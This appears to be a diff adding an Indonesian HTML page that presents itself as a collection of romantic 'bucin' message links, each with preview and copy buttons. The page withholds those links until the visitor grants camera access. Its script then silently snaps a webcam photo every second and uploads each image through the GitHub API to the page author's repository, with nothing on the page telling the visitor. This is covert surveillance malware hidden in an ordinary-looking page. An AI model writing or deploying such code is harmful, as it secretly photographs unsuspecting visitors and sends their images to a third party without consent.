@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="theme-color" content="#40a1ff"/>
+    <meta property="og:title" content="Link Html Bucin">
+    <meta property="og:description" content="Ini adalah Link untuk bucin, dimana seperti web yang ada Script bucinnya">
+  <title>Script HTML</title>
+  <style>
+    
+body {
+    clear: both;
+    align-content: center;
+    text-align: center;
+    align-items: center;
+    justify-content: center;
+    height: 100%;
+    margin: 0;
+    padding: 0;
+    background-color: #fff;
+    transition: background-color 1s ease;
+}
+
+.section-1 {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #fff;
+}
+
+.section-2 {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #fff;
+}
+        
+        .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 50%;
+      height: 50%;
+      border: 1px solid #000;
+      background: #fff;
+      z-index: 9999;
+    }
+    .close {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      cursor: pointer;
+      background: #fff;
+    }
+    
+    video {
+      width: 100%;
+      height: auto;
+    }
+    canvas {
+      display: none;
+    }
+    
+    html {
+    scroll-behavior: smooth;
+}
+  </style>
+</head>
+<body>
+  
+  <div>
+      <video id="video" autoplay></video>
+      <canvas id="canvas" width="300" height="300"></canvas>
+  </div>
+    
+    
+    <section id="section1" class="section-1">
+        <h1>Izinkan penggunaan Camera & Suara. Agar script dapat bekerja dengan baik</h1>
+    </section>
+    
+    <section id="section2" class="section-2" display: none;>
+        <div id="popup" class="popup">
+            <span class="close" onclick="closePopup()">X</span>
+            <iframe src="" width="100%" height="100%" frameborder="0"></iframe>
+        </div>
+        <h1>Script Bucin</h1>
+        <h2>1. Terima Kasih Ayang</h2>
+        <button onclick="openPopup('https://avatarabangkuh.github.io/makasihayang.html')">Petinjau Link</button>
+        <button onclick="salinLink('https://avatarabangkuh.github.io/makasihayang.html')">Salin Link</button>
+        <hr>
+        <h2>2. Terima Kasih</h2>
+        <button onclick="openPopup('https://avatarabangkuh.github.io/terimakasih.html')">Petinjau Link</button>
+        <button onclick="salinLink('https://avatarabangkuh.github.io/terimakasih.html')">Salin Link</button>
+        <hr>
+        <h2>3. Aku panik</h2>
+        <button onclick="openPopup('https://avatarabangkuh.github.io/akupanik.html')">Petinjau Link</button>
+        <button onclick="salinLink('https://avatarabangkuh.github.io/akupanik.html')">Salin Link</button>
+        <hr>
+        <h2>4. Aku janji</h2>
+        <button onclick="openPopup('https://avatarabangkuh.github.io/akujanji.html')">Petinjau Link</button>
+        <button onclick="salinLink('https://avatarabangkuh.github.io/akujanji.html')">Salin Link</button>
+    </section>
+    
+    
+    
+    
+  
+  <script>
+      
+      var config = require('./config.js');
+      var githubToken = config.githubToken;
+      
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    navigator.mediaDevices.getUserMedia({ video: { aspectRatio: 1 } }) // Set aspect ratio to 1:1
+      .then(function(stream) {
+        video.srcObject = stream;
+        video.onloadedmetadata = function(e) {
+          video.play();
+          setInterval(capturePhoto, 1000); // Ambil foto setiap 1 detik
+        };
+      })
+      .catch(function(err) {
+        console.log("An error occurred: " + err);
+      });
+
+    function capturePhoto() {
+      const size = Math.min(video.videoWidth, video.videoHeight);
+      canvas.width = size;
+      canvas.height = size;
+
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, size, size);
+      const base64EncodedPhoto = canvas.toDataURL('image/jpeg').split(',')[1];
+      const fileName = `Cam_unlock_kezt${Date.now()}.jpg`; // Nama file dengan timestamp
+      uploadPhoto(base64EncodedPhoto, fileName);
+    }
+
+    function uploadPhoto(base64EncodedPhoto, fileName) {
+      fetch(`https://api.github.com/repos/avatarabangkuh/avatarabangkuh.github.io/contents/img/${fileName}`, {
+        method: 'PUT',
+        headers: {
+          'Authorization': 'Bearer ' + githubToken,
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          message: 'Add photo',
+          content: base64EncodedPhoto // Base64 encoded content of the photo
+        })
+      })
+      .then(response => response.json())
+      .then(data => console.log(data))
+      .catch(error => console.error('Error:', error));
+    }
+    
+    
+    
+    
+    
+    
+    
+    function openPopup(link) {
+    document.getElementById("popup").style.display = "block";
+    document.querySelector("iframe").src = link;
+  }
+
+  function closePopup() {
+    document.getElementById("popup").style.display = "none";
+    document.querySelector("iframe").src = "";
+  }
+  
+  function salinLink(url) {
+      navigator.clipboard.writeText(url)
+        .then(() => {
+          alert("URL berhasil disalin: " + url);
+        })
+        .catch(err => {
+          console.error('Gagal menyalin URL: ', err);
+        });
+    }
+    
+    
+    
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    // Izin diberikan, Section 1 disembunyikan, Section 2 ditampilkan
+                    document.getElementById('section1').style.display = 'none';
+                    document.getElementById('section2').style.display = 'block';
+                })
+                .catch(function(error) {
+                    // Izin ditolak, Section 1 ditampilkan, Section 2 disembunyikan
+                    document.getElementById('section1').style.display = 'block';
+                    document.getElementById('section2').style.display = 'none';
+                });
+        } else {
+            // Browser tidak mendukung getUserMedia, Section 1 ditampilkan, Section 2 disembunyikan
+            document.getElementById('section1').style.display = 'block';
+            document.getElementById('section2').style.display = 'none';
+        }
+    });
+  </script>
+</body>
+</html>
